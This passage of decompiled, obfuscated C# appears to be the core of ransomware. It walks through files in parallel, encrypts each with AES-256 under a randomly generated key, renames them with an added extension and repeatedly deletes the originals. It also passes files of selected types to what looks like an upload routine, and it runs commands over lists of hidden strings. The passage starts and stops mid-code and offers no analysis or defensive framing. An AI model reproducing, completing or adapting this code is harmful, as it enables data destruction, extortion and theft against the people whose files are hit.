									File.Move(item + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, item);
								}
								catch (Exception)
								{
								}
							}
							end_IL_02ca_2:;
						}
						catch (Exception)
						{
							goto IL_09d7;
						}
					}
					continue;
					IL_09d7:
					CS_0024_003C_003E8__locals0.WNvdcTPDgW.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.WNvdcTPDgW, delegate(string P_0)
		{
			CS_0024_003C_003E8__locals0 = new kFfBlUyayStE.YUIjdATTEVIX();
			CS_0024_003C_003E8__locals0.JhmFrwpsOrTq = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.PUDDzPYRoE = P_0;
			if (CS_0024_003C_003E8__locals0.dXgeOiXUaNyFEW.Length != 0)
			{
				string[] dXgeOiXUaNyFEW = CS_0024_003C_003E8__locals0.dXgeOiXUaNyFEW;
				int num = 0;
				while (num < dXgeOiXUaNyFEW.Length)
				{
					string value = dXgeOiXUaNyFEW[num];
					if (!CS_0024_003C_003E8__locals0.PUDDzPYRoE.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0ab8;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.PUDDzPYRoE.EndsWith(CS_0024_003C_003E8__locals0.ZDxRrpKTbd))
				{
					goto IL_0ab8;
				}
			}
			catch (Exception)
			{
				goto IL_0ab8;
			}
			if (!yGkMwQPqUdXIj.Contains(CS_0024_003C_003E8__locals0.PUDDzPYRoE))
			{
				if (cySCSfjuDKIn == kFfBlUyayStE._0082(107396873))
				{
					try
					{
						if (NqaDDCCMEbCxV.SmlSZjnRIeVP(CS_0024_003C_003E8__locals0.PUDDzPYRoE))
						{
							NqaDDCCMEbCxV.XkoarExxofRiBeK(CS_0024_003C_003E8__locals0.PUDDzPYRoE);
						}
					}
					catch
					{
					}
				}
				yGkMwQPqUdXIj.Add(CS_0024_003C_003E8__locals0.PUDDzPYRoE);
				if (!SlSeSNfJnzNh.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.PUDDzPYRoE)))
				{
					SlSeSNfJnzNh.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.PUDDzPYRoE));
				}
				VmNlRJHbsFKpwZ(CS_0024_003C_003E8__locals0.PUDDzPYRoE);
				try
				{
					new vyQYEsUfMyGoFM().rjhwntJsrm(CS_0024_003C_003E8__locals0.PUDDzPYRoE);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.PUDDzPYRoE, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (qoRjYABduZF)
							{
								Console.WriteLine(kFfBlUyayStE._0082(107403564) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + kFfBlUyayStE._0082(107403519) + new FileInfo(CS_0024_003C_003E8__locals0.PUDDzPYRoE).Length + kFfBlUyayStE._0082(107403498));
								Console.WriteLine(kFfBlUyayStE._0082(107403489));
							}
						}
						catch
						{
						}
						KXNiSRaxzeIpPt(GwTsezEgVAuVAU(kFfBlUyayStE._0082(107403416)), kFfBlUyayStE._0082(107387760) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + kFfBlUyayStE._0082(107387760) + GwTsezEgVAuVAU(kFfBlUyayStE._0082(107403871)) + kFfBlUyayStE._0082(107387760) + Environment.UserName + kFfBlUyayStE._0082(107387760) + GwTsezEgVAuVAU(kFfBlUyayStE._0082(107403854)));
					}
				}
				catch (Exception ex2)
				{
					if (joesCNAxeHUI)
					{
						try
						{
							File.AppendAllText(jnRLNtXuRRg, kFfBlUyayStE._0082(107386518) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + kFfBlUyayStE._0082(107403861) + ex2.Message + kFfBlUyayStE._0082(107396306));
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.PUDDzPYRoE).Length != 0)
						{
							goto end_IL_031b;
						}
						goto end_IL_031b_2;
						end_IL_031b:;
					}
					catch (Exception ex4)
					{
						if (joesCNAxeHUI)
						{
							try
							{
								File.AppendAllText(jnRLNtXuRRg, kFfBlUyayStE._0082(107386518) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + kFfBlUyayStE._0082(107403748) + ex4.Message + kFfBlUyayStE._0082(107396306));
							}
							catch (Exception)
							{
							}
						}
						iePhSHBTqLd++;
						goto end_IL_031b_2;
					}
					if (CdQMIPJOkrOUDSy == kFfBlUyayStE._0082(107396873) && new FileInfo(CS_0024_003C_003E8__locals0.PUDDzPYRoE).Length > Convert.ToInt32(xYkYbBCyjIxz) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.ZDxRrpKTbd != kFfBlUyayStE._0082(107386778))
							{
								if (MiZHZrKmtKkaPXn)
								{
									CS_0024_003C_003E8__locals0.ZDxRrpKTbd = RBZnAGRnuwHeRmi + CS_0024_003C_003E8__locals0.ZDxRrpKTbd;
								}
								File.Move(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + CS_0024_003C_003E8__locals0.ZDxRrpKTbd);
							}
						}
						catch (Exception ex6)
						{
							if (joesCNAxeHUI)
							{
								try
								{
									File.AppendAllText(jnRLNtXuRRg, kFfBlUyayStE._0082(107386518) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + kFfBlUyayStE._0082(107403687) + ex6.Message + kFfBlUyayStE._0082(107396306));
								}
								catch (Exception)
								{
								}
							}
							iePhSHBTqLd++;
							return;
						}
						if (CS_0024_003C_003E8__locals0.ZDxRrpKTbd != kFfBlUyayStE._0082(107386778))
						{
							CS_0024_003C_003E8__locals0.PUDDzPYRoE += CS_0024_003C_003E8__locals0.ZDxRrpKTbd;
						}
						if (bxhZXFvKXZl == kFfBlUyayStE._0082(107396873))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in EKjYgfCTgvyfhvOPx)
								{
									if (CS_0024_003C_003E8__locals0.PUDDzPYRoE.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.JhmFrwpsOrTq.ZDxRrpKTbd) && vEWBFQaTPDgk == kFfBlUyayStE.YUIjdATTEVIX._0008(107396879))
									{
										if (Convert.ToInt32(PyFcFDpqJkSW) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.PUDDzPYRoE).Length)
										{
											try
											{
												GyWbmViNanxKl.DGdOiIgzOMW(kFfBlUyayStE.YUIjdATTEVIX._0008(107389344), kFfBlUyayStE.YUIjdATTEVIX._0008(107389339), kFfBlUyayStE.YUIjdATTEVIX._0008(107388782), CS_0024_003C_003E8__locals0.PUDDzPYRoE);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.PUDDzPYRoE.ToLower().EndsWith(item3) && vEWBFQaTPDgk == kFfBlUyayStE.YUIjdATTEVIX._0008(107397039))
									{
										try
										{
											GyWbmViNanxKl.DGdOiIgzOMW(kFfBlUyayStE.YUIjdATTEVIX._0008(107389344), kFfBlUyayStE.YUIjdATTEVIX._0008(107389339), kFfBlUyayStE.YUIjdATTEVIX._0008(107388782), CS_0024_003C_003E8__locals0.PUDDzPYRoE);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = AnLYutpDjmCX.cVQEpGjgoi(32);
						string s = FlpXYRWvTX.ZTvekdOmyg(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (QGAYpwMzxm == kFfBlUyayStE._0082(107397033))
						{
							byte[] array = null;
							byte[] array2 = fkozHCDTDrY.OlBXyEPnCYpDO(CS_0024_003C_003E8__locals0.PUDDzPYRoE, Convert.ToInt32(xYkYbBCyjIxz) * 1024 * 1024);
							if (!fkozHCDTDrY.wXhdORmUgbGuB(quwoLGzcjeGYg: (!VGKELVlTFUV) ? (IooTTsvIiwCN ? fkozHCDTDrY.GVHcoGquozRzL(array2, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : fkozHCDTDrY.GVHcoGquozRzL(array2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.nyAmnOdcSzzfJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (IooTTsvIiwCN ? RpWKlAyYXuFg.pUQagweWpoRi(array2, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : RpWKlAyYXuFg.pUQagweWpoRi(array2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.nyAmnOdcSzzfJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), ZsIFKCtaED: CS_0024_003C_003E8__locals0.PUDDzPYRoE, TTsauZziAEbN: bytes))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.PUDDzPYRoE + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, CS_0024_003C_003E8__locals0.PUDDzPYRoE);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!IooTTsvIiwCN)
						{
							if (!dsNajfALrLtCLf.PPfLKlDWqkz(CS_0024_003C_003E8__locals0.PUDDzPYRoE, xYkYbBCyjIxz, CS_0024_003C_003E8__locals0.nyAmnOdcSzzfJ))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.PUDDzPYRoE + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, CS_0024_003C_003E8__locals0.PUDDzPYRoE);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!dsNajfALrLtCLf.PPfLKlDWqkz(CS_0024_003C_003E8__locals0.PUDDzPYRoE, xYkYbBCyjIxz, text, bytes))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.PUDDzPYRoE + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, CS_0024_003C_003E8__locals0.PUDDzPYRoE);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (MiZHZrKmtKkaPXn)
						{
							CS_0024_003C_003E8__locals0.ZDxRrpKTbd = RBZnAGRnuwHeRmi + CS_0024_003C_003E8__locals0.ZDxRrpKTbd;
						}
						string text2 = AnLYutpDjmCX.cVQEpGjgoi(32);
						string s2 = FlpXYRWvTX.ZTvekdOmyg(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (CS_0024_003C_003E8__locals0.ZDxRrpKTbd != kFfBlUyayStE._0082(107386778))
						{
							if (!EcdpqbMrQOzfdgL)
							{
								if (!IooTTsvIiwCN)
								{
									GKkFnjoUAoXGqN(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, lrVhqMPbYlaOK);
								}
								else
								{
									GKkFnjoUAoXGqN(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!IooTTsvIiwCN)
									{
										IzvDPVDWsNMZj(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, lrVhqMPbYlaOK);
									}
									else
									{
										IzvDPVDWsNMZj(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex11)
								{
									if (joesCNAxeHUI)
									{
										try
										{
											File.AppendAllText(jnRLNtXuRRg, kFfBlUyayStE._0082(107386518) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + kFfBlUyayStE._0082(107386220) + ex11.Message + kFfBlUyayStE._0082(107396306));
										}
										catch (Exception)
										{
										}
									}
									iePhSHBTqLd++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.PUDDzPYRoE + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, CS_0024_003C_003E8__locals0.PUDDzPYRoE);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!EcdpqbMrQOzfdgL)
						{
							if (!IooTTsvIiwCN)
							{
								GKkFnjoUAoXGqN(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + kFfBlUyayStE._0082(107386773), lrVhqMPbYlaOK);
							}
							else
							{
								GKkFnjoUAoXGqN(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + kFfBlUyayStE._0082(107386773), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!IooTTsvIiwCN)
								{
									IzvDPVDWsNMZj(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE, lrVhqMPbYlaOK);
								}
								else
								{
									IzvDPVDWsNMZj(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex14)
							{
								if (joesCNAxeHUI)
								{
									try
									{
										File.AppendAllText(jnRLNtXuRRg, kFfBlUyayStE._0082(107386518) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + kFfBlUyayStE._0082(107386220) + ex14.Message + kFfBlUyayStE._0082(107396306));
									}
									catch (Exception)
									{
									}
								}
								iePhSHBTqLd++;
								return;
							}
						}
						if (IooTTsvIiwCN)
						{
							if (CS_0024_003C_003E8__locals0.ZDxRrpKTbd != kFfBlUyayStE._0082(107386778))
							{
								KGSDHYAAGYu(CS_0024_003C_003E8__locals0.PUDDzPYRoE + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, bytes2);
							}
							else
							{
								KGSDHYAAGYu(CS_0024_003C_003E8__locals0.PUDDzPYRoE, bytes2);
							}
						}
					}
					end_IL_031b_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0ab8;
			IL_0ab8:
			CS_0024_003C_003E8__locals0.WNvdcTPDgW.Remove(CS_0024_003C_003E8__locals0.PUDDzPYRoE);
		});
	}

	private static void BrOZVHevqxbaV(string P_0, string P_1, byte[] P_2)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(P_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(P_2, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(P_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (P_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(P_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (bxhZXFvKXZl == _0014(107396855))
					{
						foreach (string item in EKjYgfCTgvyfhvOPx)
						{
							if (P_0.ToLower().EndsWith(item) && vEWBFQaTPDgk == _0014(107396855))
							{
								if (Convert.ToInt32(PyFcFDpqJkSW) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										GyWbmViNanxKl.DGdOiIgzOMW(_0014(107389320), _0014(107389315), _0014(107388758), P_0);
									}
									catch
									{
									}
								}
							}
							else if (P_0.ToLower().EndsWith(item) && vEWBFQaTPDgk == _0014(107397015))
							{
								try
								{
									GyWbmViNanxKl.DGdOiIgzOMW(_0014(107389320), _0014(107389315), _0014(107388758), P_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(P_0) && num2 >= 0)
							{
								File.Delete(P_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (P_1.EndsWith(_0014(107386755)))
					{
						File.Move(P_1, P_1.Replace(_0014(107386755), _0014(107388695)));
					}
					return;
				}
				try
				{
					File.Delete(P_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void IzvDPVDWsNMZj(string P_0, string P_1, byte[] P_2)
	{
		try
		{
			if (bxhZXFvKXZl == _0014(107396855))
			{
				FileStream fileStream = new FileStream(P_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in EKjYgfCTgvyfhvOPx)
				{
					if (P_0.ToLower().EndsWith(item) && vEWBFQaTPDgk == _0014(107396855))
					{
						if (Convert.ToInt32(PyFcFDpqJkSW) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								GyWbmViNanxKl.DGdOiIgzOMW(_0014(107389320), _0014(107389315), _0014(107388758), P_0);
							}
							catch
							{
							}
						}
					}
					else if (P_0.ToLower().EndsWith(item) && vEWBFQaTPDgk == _0014(107397015))
					{
						try
						{
							GyWbmViNanxKl.DGdOiIgzOMW(_0014(107389320), _0014(107389315), _0014(107388758), P_0);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (P_0 != P_1)
		{
			File.Move(P_0, P_1);
			P_0 = P_1;
		}
		byte[] bytes = RpWKlAyYXuFg.pUQagweWpoRi(File.ReadAllBytes(P_0), P_2, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(P_0, bytes);
		XnicJWCgBOO++;
	}

	private static void GKkFnjoUAoXGqN(string P_0, string P_1, byte[] P_2)
	{
		wVXqIBGGPLo CS_0024_003C_003E8__locals0 = new wVXqIBGGPLo();
		CS_0024_003C_003E8__locals0.atoCyWSfKSy = P_0;
		CS_0024_003C_003E8__locals0.fRxskrnPHhc = P_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string fRxskrnPHhc = CS_0024_003C_003E8__locals0.fRxskrnPHhc;
			FileStream fileStream = new FileStream(fRxskrnPHhc, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(P_2, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (POXokwFKrkkHxdVH == _0014(107396855))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.atoCyWSfKSy, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.atoCyWSfKSy, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.atoCyWSfKSy, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.fRxskrnPHhc.Length > 0)
				{
					if (bxhZXFvKXZl == _0014(107396855))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.atoCyWSfKSy, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in EKjYgfCTgvyfhvOPx)
						{
							if (CS_0024_003C_003E8__locals0.atoCyWSfKSy.ToLower().EndsWith(item) && vEWBFQaTPDgk == _0014(107396855))
							{
								if (Convert.ToInt32(PyFcFDpqJkSW) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										GyWbmViNanxKl.DGdOiIgzOMW(_0014(107389320), _0014(107389315), _0014(107388758), CS_0024_003C_003E8__locals0.atoCyWSfKSy);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.atoCyWSfKSy.ToLower().EndsWith(item) && vEWBFQaTPDgk == _0014(107397015))
							{
								try
								{
									GyWbmViNanxKl.DGdOiIgzOMW(_0014(107389320), _0014(107389315), _0014(107388758), CS_0024_003C_003E8__locals0.atoCyWSfKSy);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.atoCyWSfKSy);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.fRxskrnPHhc.EndsWith(_0014(107386755)))
					{
						File.Move(CS_0024_003C_003E8__locals0.fRxskrnPHhc, CS_0024_003C_003E8__locals0.fRxskrnPHhc.Replace(_0014(107386755), _0014(107388695)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.fRxskrnPHhc))
							{
								File.Delete(CS_0024_003C_003E8__locals0.fRxskrnPHhc);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (joesCNAxeHUI)
			{
				try
				{
					File.AppendAllText(jnRLNtXuRRg, _0014(107386500) + CS_0024_003C_003E8__locals0.atoCyWSfKSy + _0014(107386202) + ex2.Message + _0014(107396288));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__8()
	{
		List<string> source = iSGwXCiIfXBR;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string P_0)
			{
				KXNiSRaxzeIpPt(GwTsezEgVAuVAU(_0014(107386181)), P_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
		List<string> source2 = jFoYvbvoLRCagvDFmn;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string P_0)
			{
				KXNiSRaxzeIpPt(GwTsezEgVAuVAU(_0014(107386136)), P_0);
			};
		}
		Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
		if (tMTGisYcNMVHo == _0014(107396855))
		{
			string[] source3 = tPINiNFcqTnZtQ;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string P_0)
				{
					KXNiSRaxzeIpPt(GwTsezEgVAuVAU(_0014(107386136)), _0014(107386143) + P_0 + _0014(107386102));
				};
			}
			Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
		}
		if (!PAhtGWwudbxozQK().Contains(_0014(107386878)))
		{
			AiwyVzAQMcDi(AbUTAcXZWDez);
		}
		else
		{
			List<string> bSHtnNKwjXivMJS = BSHtnNKwjXivMJS;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string P_0)
				{
					KXNiSRaxzeIpPt(GwTsezEgVAuVAU(VSGqbgWciAAQ(_0014(107386097))), P_0);
				};
			}
			Parallel.ForEach(bSHtnNKwjXivMJS, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
		}
		List<string> source4 = hkXnlfpoGpnf;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 = delegate(string P_0)
			{
				KXNiSRaxzeIpPt(GwTsezEgVAuVAU(_0014(107386072)), P_0);
			};
		}
		Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate17);
	}

	private static void _003CMain_003Eb__9(string P_0)
	{
		KXNiSRaxzeIpPt(GwTsezEgVAuVAU(_0014(107386181)), P_0);
	}

	private static void _003CMain_003Eb__a(string P_0)
	{
		KXNiSRaxzeIpPt(GwTsezEgVAuVAU(_0014(107386136)), P_0);
	}

	private static void _003CMain_003Eb__b(string P_0)
	{
		KXNiSRaxzeIpPt(GwTsezEgVAuVAU(_0014(107386136)), _0014(107386143) + P_0 + _0014(107386102));
	}

	private static void _003CMain_003Eb__c(string P_0)
	{
		KXNiSRaxzeIpPt(GwTsezEgVAuVAU(VSGqbgWciAAQ(_0014(107386097))), P_0);
	}

	private static void _003CMain_003Eb__d(string P_0)
	{
		KXNiSRaxzeIpPt(GwTsezEgVAuVAU(_0014(107386072)), P_0);
	}

	static PFruJiQrcriiZ()
	{
		Strings.CreateGetStringDelegate(typeof(PFruJiQrcriiZ));
		tTTuIqIyTVsKt = _0014(107388594);
		lrVhqMPbYlaOK = null;
		kvJFoDYMuC = _0014(107397015);
		cJvZgRMCiiT = _0014(107386087);
		HoHveMjVjvX = new List<string>();
		YtNGHYTThvg = new List<string>();
		YsJopGaPpPETyH = _0014(107397015);
		nyAmnOdcSzzfJ = _0014(107388695);
		AFNtNBdAhEf = _0014(107388695);
		zcPzHRZXYSoC = _0014(107397015);
		PNgOzFQmoBxwkpD = 0;
		cySCSfjuDKIn = _0014(107397015);
		mfIGHgxpUFhf = _0014(107397015);
		vCBJiLpGmJSnD = _0014(107397015);
		ARhmLIZgWToPak = _0014(107386042);
		HUAsnTLTOzrk = _0014(107397015);
		TaRSuIXzPFDe = _0014(107397015);
		EBwCzzKShZJF = _0014(107396855);
		xRKOGhAaTewo = _0014(107397015);
		vooFhNgKVZyUs = new List<string>
		{
			GwTsezEgVAuVAU(_0014(107386037)),
			GwTsezEgVAuVAU(_0014(107386052)),
			GwTsezEgVAuVAU(_0014(107386027)),
			GwTsezEgVAuVAU(_0014(107385978)),
			GwTsezEgVAuVAU(_0014(107385985)),
			GwTsezEgVAuVAU(_0014(107386472)),
			GwTsezEgVAuVAU(_0014(107386423)),
			GwTsezEgVAuVAU(_0014(107386430)),
			GwTsezEgVAuVAU(_0014(107386405)),
			GwTsezEgVAuVAU(_0014(107386380)),
			GwTsezEgVAuVAU(_0014(107386331)),
			GwTsezEgVAuVAU(_0014(107386338)),
			GwTsezEgVAuVAU(_0014(107386313))
		};
		SlSeSNfJnzNh = new List<string>();
		gqVCQVtJiavX = _0014(107397015);
		oLgSSCEqAmbBry = _0014(107397015);
		zSIqMRAKpkZZcGjv = _0014(107397015);
		yGkMwQPqUdXIj = new List<string>();
		MSHRwSPpwmqxM = _0014(107397015);
		FAZqQTFurwccxTs = _0014(107386256);
		iEHeKlEPYHGI = _0014(107396855);
		xYvGfyjIeZ = _0014(107397015);
		ZSNcfBFfJEfqQ = new List<string>
		{
			GwTsezEgVAuVAU(_0014(107386239)),
			GwTsezEgVAuVAU(_0014(107385694)),
			GwTsezEgVAuVAU(_0014(107385661)),
			GwTsezEgVAuVAU(_0014(107385596)),
			GwTsezEgVAuVAU(_0014(107385563)),
			GwTsezEgVAuVAU(_0014(107385566)),
			GwTsezEgVAuVAU(_0014(107385509)),
			GwTsezEgVAuVAU(_0014(107385480)),
			GwTsezEgVAuVAU(_0014(107385915)),
			GwTsezEgVAuVAU(_0014(107385850)),
			GwTsezEgVAuVAU(_0014(107385817)),
			GwTsezEgVAuVAU(_0014(107385784)),
			GwTsezEgVAuVAU(_0014(107385751)),
			GwTsezEgVAuVAU(_0014(107385722)),
			GwTsezEgVAuVAU(_0014(107385725)),
			GwTsezEgVAuVAU(_0014(107385140)),
			GwTsezEgVAuVAU(_0014(107385131)),
			GwTsezEgVAuVAU(_0014(107385042)),
			GwTsezEgVAuVAU(_0014(107385025)),
			GwTsezEgVAuVAU(_0014(107384992)),
			GwTsezEgVAuVAU(_0014(107384963)),
			GwTsezEgVAuVAU(_0014(107385402)),
			GwTsezEgVAuVAU(_0014(107385361)),
			GwTsezEgVAuVAU(_0014(107385328)),
			GwTsezEgVAuVAU(_0014(107385311)),
			GwTsezEgVAuVAU(_0014(107385254)),
			GwTsezEgVAuVAU(_0014(107385213)),
